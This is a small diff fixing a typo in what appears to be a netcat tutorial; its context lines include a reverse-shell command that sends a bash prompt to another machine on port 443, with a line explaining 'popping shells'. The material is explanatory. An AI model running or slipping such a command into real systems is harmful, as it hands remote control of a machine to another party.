@@ -145,7 +145,7 @@ Alice then sends control of her command prompt to Bob's machine, via netcat:
 nc -nv [bob] 443 -e /bin/bash
 ```
 
-This is what hackers mean by popping shells, but usually it's getting a web server/deasktop to send a reverse shell to your attack machine.
+This is what hackers mean by popping shells, but usually it's getting a web server/desktop to send a reverse shell to your attack machine.
 
 ### Transfer files
 
